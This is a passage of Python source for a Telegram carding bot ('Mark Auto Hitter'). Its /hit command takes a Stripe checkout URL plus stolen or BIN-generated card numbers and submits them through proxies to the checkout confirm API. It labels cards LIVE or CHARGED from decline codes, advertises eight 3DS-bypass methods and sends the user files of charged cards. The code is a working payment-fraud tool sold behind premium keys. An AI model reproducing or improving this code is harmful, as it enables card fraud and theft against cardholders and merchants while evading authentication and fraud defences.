                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                f"&expected_payment_method_type=card&key={self.pk}&init_checksum={quote(checksum)}"
                f"&muid={self.tracking['muid']}&sid={self.tracking['sid']}&guid={self.tracking['guid']}"
            )

            async with self.session.post(f"https://api.stripe.com/v1/payment_pages/{cs_to_use}/confirm",
                                         headers=self._get_headers(), data=conf_body, proxy=self.proxy_url,
                                         proxy_auth=self.proxy_auth) as r:
                conf = await r.json()

            if "error" in conf:
                err = conf["error"]
                dc = err.get("decline_code", "")
                msg = err.get("message", "Failed")
                code = err.get("code", "")

                if self._is_3ds_error(conf):
                    bypass_result = await self._attempt_3ds_bypass(card, cs_to_use, conf)
                    if bypass_result:
                        result = bypass_result
                        result["elapsed"] = time.time() - start_time
                        return result
                    result["3ds_required"] = True
                    result["status"] = "3DS"
                    result["message"] = f"3DS Required: {msg[:100]}"
                elif "captcha" in msg.lower() or code == "captcha_required":
                    result["status"] = "HCAPTCHA"
                    result["message"] = "Hcaptcha Required"
                elif dc == "challenge_required" or code == "challenge_required" or dc == "require_action":
                    bypass_result = await self._attempt_3ds_bypass(card, cs_to_use, conf)
                    if bypass_result:
                        result = bypass_result
                        result["elapsed"] = time.time() - start_time
                        return result
                    result["3ds_required"] = True
                    result["status"] = "3DS"
                    result["message"] = "3DS Challenge Required"
                elif dc in ("incorrect_cvc", "insufficient_funds", "incorrect_cvv") or \
                        any(x in msg.lower() for x in
                            ["security code is incorrect", "insufficient funds", "cvc is incorrect", "cvv is incorrect",
                             "incorrect cvv"]):
                    result["status"] = "LIVE"
                    result["message"] = f"{dc.upper()}: {msg}" if dc else msg
                else:
                    result["status"] = "DECLINED"
                    result["message"] = f"{dc.upper()}: {msg}" if dc else msg
            else:
                pi = conf.get("payment_intent") or {}
                st = pi.get("status", "") or conf.get("status", "")

                if st == "succeeded":
                    result["status"] = "CHARGED"
                    result["message"] = "Payment successful"
                elif st == "requires_action":
                    bypass_result = await self._attempt_3ds_bypass(card, cs_to_use, conf)
                    if bypass_result:
                        result = bypass_result
                        result["elapsed"] = time.time() - start_time
                        return result
                    result["3ds_required"] = True
                    result["status"] = "3DS"
                    result["message"] = "3DS Authentication Required"
                elif st == "requires_payment_method":
                    err_pi = pi.get("last_payment_error") or {}
                    code = err_pi.get("decline_code", "")
                    msg = err_pi.get("message", "Card declined")

                    if "captcha" in msg.lower() or code == "captcha_required":
                        result["status"] = "HCAPTCHA"
                        result["message"] = "Hcaptcha Required"
                    elif self._is_3ds_error(err_pi):
                        bypass_result = await self._attempt_3ds_bypass(card, cs_to_use, conf)
                        if bypass_result:
                            result = bypass_result
                            result["elapsed"] = time.time() - start_time
                            return result
                        result["3ds_required"] = True
                        result["status"] = "3DS"
                        result["message"] = f"3DS Required: {msg[:100]}"
                    elif code in ("incorrect_cvc", "insufficient_funds", "incorrect_cvv") or \
                            any(x in msg.lower() for x in
                                ["security code is incorrect", "insufficient funds", "cvc is incorrect",
                                 "cvv is incorrect", "incorrect cvv"]):
                        result["status"] = "LIVE"
                        result["message"] = f"{code} - {msg}"
                    else:
                        result["status"] = "DECLINED"
                        result["message"] = f"{code} - {msg}"
                else:
                    result["status"] = "ERROR"
                    result["message"] = f"Unknown status: {st}"

        except Exception as e:
            result["status"] = "ERROR"
            result["message"] = str(e)[:60]

        result["elapsed"] = time.time() - start_time
        result["bypass_method"] = self.bypass_method_used if self.bypass_method_used else None
        return result


MAX_CARDS_PER_HIT = 50
DEFAULT_GEN_COUNT = 10


def extract_checkout_url(text: str) -> Optional[str]:
    patterns = [
        r'https?://checkout\.stripe\.com/[^\s]+',
        r'https?://[^\s]+\.stripe\.com/[^\s]+',
        r'https?://[^\s]+/cs_(live|test)_[A-Za-z0-9]+[^\s]*',
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(0)
    return None


def extract_cards_from_text(text: str) -> List[str]:
    cards = []
    lines = text.split('\n')

    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue

        patterns = [
            r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
            r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
            r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
            r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, line)
            for match in matches:
                if len(match) >= 4:
                    card_number, month, year, cvv = match[:4]
                    month = month.zfill(2)
                    if len(year) == 4:
                        year = year[2:]
                    cards.append(f"{card_number}|{month}|{year}|{cvv}")
            if cards and len(cards) >= MAX_CARDS_PER_HIT:
                break

    seen = set()
    unique_cards = []
    for card in cards:
        if card not in seen:
            seen.add(card)
            unique_cards.append(card)

    return unique_cards[:MAX_CARDS_PER_HIT]


def extract_bin_from_text(text: str) -> Optional[str]:
    match = re.search(r'\b(\d{6,8})\b', text)
    if match:
        return match.group(0)
    return None


def generate_cards_from_bin(bin_pattern: str, count: int = DEFAULT_GEN_COUNT) -> List[Dict]:
    cards = []
    for _ in range(count):
        card_data = generate_card(bin_pattern)
        cards.append(card_data)
    return cards


@check_lock
@not_banned
@log_command
@rate_limit("gate")
async def handle_hit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if not is_premium(user_id):
        await update.message.reply_text(
            f"""
{E.WARNING} ⌠ 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙍𝙀𝙌𝙐𝙄𝙍𝙀𝘿 ⌡
━━━━━━━━━━━━━━━━━━
{E.NOTE} /hit is only available for premium users.

Use /redeem to activate your premium key.
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    if not is_gate_enabled('stripe_hit'):
        await update.message.reply_text(
            f"""
{E.CLOSE} ⌠ 𝙂𝘼𝙏𝙀 𝙐𝙉𝘼𝙑𝘼𝙄𝙇𝘼𝘽𝙇𝙀 ⌡
━━━━━━━━━━━━━━━━━━
{E.NOTE} The <b>Stripe Hit</b> gate is currently disabled.
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    proxies_data = get_user_proxies(user_id)
    proxies = [p["proxy"] for p in proxies_data if p.get("status") == "active"]
    if not proxies:
        proxies = [p["proxy"] for p in proxies_data]

    if not proxies:
        await update.message.reply_text(
            f"""
{E.WARNING} ⌠ 𝙉𝙊 𝙋𝙍𝙊𝙓𝙄𝙀𝙎 𝙁𝙊𝙐𝙉𝘿 ⌡
━━━━━━━━━━━━━━━━━━
{E.NOTE} Add proxies using /addproxy first.
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    args = context.args or []
    full_text = " ".join(args) if args else ""

    if update.message.reply_to_message:
        reply = update.message.reply_to_message
        if reply.text:
            full_text = reply.text + "\n" + full_text
        elif reply.caption:
            full_text = reply.caption + "\n" + full_text
        elif reply.document:
            try:
                file = await context.bot.get_file(reply.document.file_id)
                file_content = await file.download_as_bytearray()
                text = file_content.decode('utf-8', errors='ignore')
                full_text = text + "\n" + full_text
            except Exception as e:
                logger.error(f"Failed to read file: {e}")

    if not full_text:
        await update.message.reply_text(
            f"""
{E.INFO} ⌠ 𝙃𝙄𝙏 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 ⌡
━━━━━━━━━━━━━━━━━━
<b>Usage:</b>
<code>/hit &lt;checkout_url&gt; [bin|cc]</code>

<b>With BIN (generates 10 cards):</b>
<code>/hit https://checkout.stripe.com/... 486732</code>

<b>With CC list (reply to message):</b>
Reply to a message with cards:
<code>4111111111111111|12|26|123
4242424242424242|12|26|123</code>

<b>Or provide CC directly:</b>
<code>/hit https://checkout.stripe.com/... 4111111111111111|12|26|123</code>

<b>🔥 8x 3D Bypass Methods:</b>
• Frictionless Flow
• Radar Manipulation
• Device Fingerprinting
• Card Brand Specific
• Metadata Injection
• Country Manipulation
• Session Reuse
• Direct Confirm
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    checkout_url = extract_checkout_url(full_text)
    if not checkout_url:
        await update.message.reply_text(
            f"""
{E.ERROR} ⌠ 𝙉𝙊 𝘾𝙃𝙀𝘾𝙆𝙊𝙐𝙏 𝙐𝙍𝙇 𝙁𝙊𝙐𝙉𝘿 ⌡
━━━━━━━━━━━━━━━━━━
{E.NOTE} Could not find a Stripe checkout URL.

Make sure the URL starts with:
<code>https://checkout.stripe.com/...</code>
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    cards = extract_cards_from_text(full_text)
    bin_pattern = extract_bin_from_text(full_text)

    if not cards and not bin_pattern:
        remaining = full_text.replace(checkout_url, "").strip()
        bin_match = re.search(r'\b(\d{6,8})\b', remaining)
        if bin_match:
            bin_pattern = bin_match.group(0)

    card_list = []

    if cards:
        card_list = [{"cc": c.split("|")[0], "month": c.split("|")[1], "year": c.split("|")[2], "cvv": c.split("|")[3],
                      "full": c, "brand": get_card_brand(c.split("|")[0])} for c in cards]
        logger.info(f"Using {len(card_list)} provided cards")
    elif bin_pattern:
        card_list = generate_cards_from_bin(bin_pattern, DEFAULT_GEN_COUNT)
        logger.info(f"Generated {len(card_list)} cards from BIN {bin_pattern}")
    else:
        await update.message.reply_text(
            f"""
{E.ERROR} ⌠ 𝙉𝙊 𝘾𝘼𝙍𝘿𝙎 𝙊𝙍 𝘽𝙄𝙉 𝙁𝙊𝙐𝙉𝘿 ⌡
━━━━━━━━━━━━━━━━━━
{E.NOTE} Please provide either:
• BIN (6-8 digits) → generates 10 cards
• CC list (CC|MM|YY|CVV format)

<b>Example with BIN:</b>
<code>/hit https://checkout.stripe.com/... 486732</code>

<b>Example with CC:</b>
<code>/hit https://checkout.stripe.com/... 4111111111111111|12|26|123</code>
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    if len(card_list) > MAX_CARDS_PER_HIT:
        card_list = card_list[:MAX_CARDS_PER_HIT]
        await update.message.reply_text(
            f"{E.WARNING} Limited to {MAX_CARDS_PER_HIT} cards.",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )

    proxy = random.choice(proxies)
    logger.info(f"Using proxy: {proxy[:30]}...")

    progress_text = f"""
✦ <b>𝙈𝘼𝙍𝙆 𝘼𝙐𝙏𝙊 𝙃𝙄𝙏𝙏𝙀𝙍</b> ✦

<b>𝙈𝙚𝙧𝙘𝙝𝙖𝙣𝙩</b> ➔ Loading...
<b>𝘼𝙢𝙤𝙪𝙣𝙩</b> ➔ Loading...
<b>𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜</b> ➔ 0/{len(card_list)}
<b>3D Bypass</b> ➔ ✅ 8 Methods

<i>Initializing checkout...</i>

<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"""

    progress_msg = await update.message.reply_text(
        progress_text,
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    async def run_hit():
        hit_start_time = time.time()
        checker = None
        results = []
        stats = {
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "3ds": 0,
            "captcha": 0,
            "error": 0,
            "3ds_bypassed": 0,
            "bypass_methods_used": [],
        }

        try:
            checker = AsyncStripeChecker(checkout_url, proxy)
            checker.bypass_3ds = True

            logger.info(f"Prefetching checkout: {checkout_url[:60]}...")
            if not await checker.prefetch():
                await progress_msg.edit_text(
                    f"""
✦ <b>𝙈𝘼𝙍𝙆 𝘼𝙐𝙏𝙊 𝙃𝙄𝙏𝙏𝙀𝙍</b> ✦
━━━━━━━━━━━━━━━━━━━━━━━━━━
{E.ERROR} <b>Failed to fetch checkout</b>

Could not initialize checkout session.

Check if the URL is valid and accessible.
━━━━━━━━━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
                    parse_mode="HTML",
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
                return

            merchant = checker.merchant
            amount = checker.amount_str

            logger.info(f"Checkout: {merchant} | {amount}")

            for idx, card_data in enumerate(card_list, 1):
                try:
                    result = await checker.charge_card(card_data)

                    status = result.get("status", "ERROR")
                    message = result.get("message", "Unknown")
                    card_full = card_data.get("full", "Unknown")
                    is_3ds = result.get("3ds_required", False)
                    is_3ds_bypassed = result.get("3ds_bypassed", False)
                    bypass_method = result.get("bypass_method", None)

                    if bypass_method and bypass_method not in stats["bypass_methods_used"]:
                        stats["bypass_methods_used"].append(bypass_method)

                    if status == "CHARGED":
                        stats["charged"] += 1
                    elif status == "APPROVED" or "insufficient" in message.lower():
                        stats["approved"] += 1
                    elif status == "DECLINED":
                        stats["declined"] += 1
                    elif status == "3DS":
                        stats["3ds"] += 1
                        if is_3ds_bypassed:
                            stats["3ds_bypassed"] += 1
                    elif status == "HCAPTCHA":
                        stats["captcha"] += 1
                    else:
                        stats["error"] += 1

                    results.append({
                        "card": card_full,
                        "status": status,
                        "message": message,
                        "elapsed": result.get("elapsed", 0),
                        "3ds_required": is_3ds,
                        "3ds_bypassed": is_3ds_bypassed,
                        "bypass_method": bypass_method,
                    })

                    if idx % 2 == 0 or idx == len(card_list):
                        await update_progress(progress_msg, results, idx, len(card_list), merchant, amount)

                except Exception as e:
                    logger.error(f"Card {idx} error: {e}")
                    results.append({
                        "card": card_data.get("full", "Unknown"),
                        "status": "ERROR",
                        "message": str(e)[:50],
                        "elapsed": 0,
                        "3ds_required": False,
                        "3ds_bypassed": False,
                        "bypass_method": None,
                    })

        except Exception as e:
            logger.error(f"Hit error: {e}")
            await progress_msg.edit_text(
                f"""
✦ <b>𝙈𝘼𝙍𝙆 𝘼𝙐𝙏𝙊 𝙃𝙄𝙏𝙏𝙀𝙍</b> ✦
━━━━━━━━━━━━━━━━━━━━━━━━━━
{E.ERROR} <b>Hit Error</b>

{str(e)[:200]}
━━━━━━━━━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
            return
        finally:
            if checker:
                await checker.close()

        total_time = time.time() - hit_start_time
        await show_final_results(progress_msg, results, merchant, amount, checkout_url, total_time, user_id, context, stats)

    async def update_progress(msg, results, idx, total, merchant, amount):
        recent = results[-3:] if len(results) > 3 else results

        lines = []
        for r in recent:
            card = r['card']
            status = r['status']
            message = r['message'][:50]
            elapsed = r.get('elapsed', 0)
            is_3ds = r.get('3ds_required', False)
            is_3ds_bypassed = r.get('3ds_bypassed', False)
            bypass_method = r.get('bypass_method', None)

            if status == "CHARGED":
                status_display = "CHARGED ✅"
            elif status == "APPROVED" or "insufficient" in message.lower():
                status_display = "APPROVED ✔️"
            elif status == "DECLINED":
                status_display = "DEAD ❌"
            elif status == "3DS":
                if is_3ds_bypassed:
                    status_display = f"3DS BYPASSED 🔓"
                else:
                    status_display = "3DS 🔐"
            elif status == "HCAPTCHA":
                status_display = "CAPTCHA ⚠️"
            else:
                status_display = "ERROR ❌"

            bypass_text = f" [{bypass_method}]" if bypass_method else ""

            lines.append(f"✦ {E.CARD} ➔ <code>{card}</code>")
            lines.append(f"✦ Status ➔ {status_display}{bypass_text}")
            lines.append(f"✦ Response ➔ <code>{message}</code>")
            lines.append(f"✦ Time ➔ {elapsed:.2f}s")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━")

        text = f"""
✦ <b>𝙈𝘼𝙍𝙆 𝘼𝙐𝙏𝙊 𝙃𝙄𝙏𝙏𝙀𝙍</b> ✦

<b>𝙈𝙚𝙧𝙘𝙝𝙖𝙣𝙩</b> ➔ {merchant[:40]} ― {amount}
<b>𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙</b> ➔ {idx}/{total}
<b>3D Bypass</b> ➔ ✅ 8 Methods

{''.join(lines) if lines else 'Processing...'}

<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"""

        try:
            await msg.edit_text(
                text,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
        except Exception as e:
            if "Message is not modified" not in str(e):
                logger.error(f"Progress update error: {e}")

    async def show_final_results(msg, results, merchant, amount, url, total_time, user_id, context, stats):
        total = len(results)

        lines = []
        for idx, r in enumerate(results, 1):
            card = r['card']
            status = r['status']
            message = r['message'][:60]
            elapsed = r.get('elapsed', 0)
            is_3ds = r.get('3ds_required', False)
            is_3ds_bypassed = r.get('3ds_bypassed', False)
            bypass_method = r.get('bypass_method', None)

            if status == "CHARGED":
                status_display = "CHARGED ✅"
            elif status == "APPROVED" or "insufficient" in message.lower():
                status_display = "APPROVED ✔️"
            elif status == "DECLINED":
                status_display = "DEAD ❌"
            elif status == "3DS":
                if is_3ds_bypassed:
                    status_display = f"3DS BYPASSED 🔓"
                else:
                    status_display = "3DS 🔐"
            elif status == "HCAPTCHA":
                status_display = "CAPTCHA ⚠️"
            else:
                status_display = "ERROR ❌"

            bypass_text = f" [{bypass_method}]" if bypass_method else ""

            try:
                bin_num = card.split('|')[0][:6]
                from bin import get_bin_info
                bin_info = await get_bin_info(bin_num)
                brand = bin_info.get('scheme', 'UNKNOWN').upper()
                card_type = bin_info.get('type', '').upper()
                bank = bin_info.get('bank', 'Unknown')
                country = bin_info.get('country', 'Unknown')
                country_flag = bin_info.get('country_emoji', '🌍')
            except Exception as e:
                logger.error(f"BIN lookup error: {e}")
                brand = 'UNKNOWN'
                card_type = ''
                bank = 'Unknown'
                country = 'Unknown'
                country_flag = '🌍'

            lines.append(f"""
✦ <b>𝘾𝘾 #{idx}</b> ➔ <code>{card}</code>
✦ <b>𝙎𝙩𝙖𝙩𝙪𝙨</b> ➔ {status_display}{bypass_text}
✦ <b>𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚</b> ➔ <code>{message}</code>
✦ <b>𝘽𝙄𝙉</b> ➔ {brand} {card_type}
✦ <b>𝘽𝙖𝙣𝙠</b> ➔ {bank}
✦ <b>𝘾𝙤𝙪𝙣𝙩𝙧𝙮</b> ➔ {country_flag} {country.upper()}
{'✦ <b>3DS</b> ➔ BYPASSED 🔓' if is_3ds_bypassed else ''}
{'✦ <b>3DS</b> ➔ REQUIRED 🔐' if is_3ds and not is_3ds_bypassed else ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━""")

        if total_time < 60:
            total_elapsed = f"{total_time:.2f}s"
        elif total_time < 3600:
            mins = int(total_time // 60)
            secs = total_time % 60
            total_elapsed = f"{mins}m {secs:.2f}s"
        else:
            hrs = int(total_time // 3600)
            mins = int((total_time % 3600) // 60)
            secs = total_time % 60
            total_elapsed = f"{hrs}h {mins}m {secs:.2f}s"

        bypass_methods_used = stats["bypass_methods_used"]
        bypass_text_summary = ", ".join(bypass_methods_used) if bypass_methods_used else "None"

        summary = f"""
✦ <b>𝙎𝙐𝙈𝙈𝘼𝙍𝙔</b>
✦ {E.CHARGE} Charged: {stats['charged']}
✦ {E.APPROVED} Approved: {stats['approved']}
✦ {E.DECLINED} Declined: {stats['declined']}
✦ 🔐 3DS Required: {stats['3ds']}
✦ 🔓 3DS Bypassed: {stats['3ds_bypassed']}
✦ ⚠️ CAPTCHA: {stats['captcha']}
✦ ❌ Errors: {stats['error']}
✦ 🔥 Bypass Methods: {bypass_text_summary}
"""

        text = f"""
✦ <b>𝙈𝘼𝙍𝙆 𝘼𝙐𝙏𝙊 𝙃𝙄𝙏𝙏𝙀𝙍</b> ✦

<b>𝙈𝙚𝙧𝙘𝙝𝙖𝙣𝙩</b> ➔ {merchant[:40]}
<b>𝘼𝙢𝙤𝙪𝙣𝙩</b> ➔ {amount}
<b>𝙏𝙤𝙩𝙖𝙡</b> ➔ {total} cards
<b>3D Bypass</b> ➔ ✅ 8 Methods
{summary}
{''.join(lines)}

<b>𝙏𝙤𝙩𝙖𝙡 𝙏𝙞𝙢𝙚</b> ➔ {total_elapsed}

<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"""

        try:
            if len(text) > 4096:
                file = io.BytesIO(text.encode('utf-8'))
                file.name = f"hit_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                await context.bot.send_document(
                    chat_id=user_id,
                    document=file,
                    caption=f"""
✦ <b>𝙈𝘼𝙍𝙆 𝘼𝙐𝙏𝙊 𝙃𝙄𝙏𝙏𝙀𝙍</b> ✦
━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>𝙈𝙚𝙧𝙘𝙝𝙖𝙣𝙩</b> ➔ {merchant[:40]}
<b>𝙏𝙤𝙩𝙖𝙡</b> ➔ {total} cards
<b>𝙏𝙞𝙢𝙚</b> ➔ {total_elapsed}
<b>3D Bypass</b> ➔ ✅ 8 Methods

<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
                    parse_mode="HTML",
                )
                await msg.delete()
            else:
                await msg.edit_text(
                    text,
                    parse_mode="HTML",
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
        except Exception as e:
            logger.error(f"Final update error: {e}")

        charged_cards = [r["card"] for r in results if r["status"] == "CHARGED"]
        if charged_cards:
            file = io.BytesIO("\n".join(charged_cards).encode('utf-8'))
            file.name = f"charged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            try:
                await context.bot.send_document(
                    chat_id=user_id,
                    document=file,
                    caption=f"""
✦ <b>𝙈𝘼𝙍𝙆 𝘼𝙐𝙏𝙊 𝙃𝙄𝙏𝙏𝙀𝙍</b> ✦
━━━━━━━━━━━━━━━━━━━━━━━━━━
{E.SUCCESS} {len(charged_cards)} Charged cards

<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
                    parse_mode="HTML",
                )
            except Exception as e:
                logger.error(f"Failed to send charged file: {e}")

        bypassed_cards = [r["card"] for r in results if r.get("3ds_bypassed", False)]
        if bypassed_cards:
            file = io.BytesIO("\n".join(bypassed_cards).encode('utf-8'))
            file.name = f"3ds_bypassed_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            try:
                await context.bot.send_document(
                    chat_id=user_id,
                    document=file,
                    caption=f"""
✦ <b>𝙈𝘼𝙍𝙆 𝘼𝙐𝙏𝙊 𝙃𝙄𝙏𝙏𝙀𝙍</b> ✦
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔓 {len(bypassed_cards)} 3DS Bypassed cards
🔥 Methods: {bypass_text_summary}

<a href='https://t.me/oggyproo'>⌬</a> <b>𝐃𝐞𝐯</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
                    parse_mode="HTML",
                )
            except Exception as e:
                logger.error(f"Failed to send bypassed file: {e}")

    await run_hit()


def register_hit(app):
    app.add_handler(CommandHandler("hit", handle_hit_command))
    logger.info("✅ /hit command registered with 8x 3DS bypass methods")
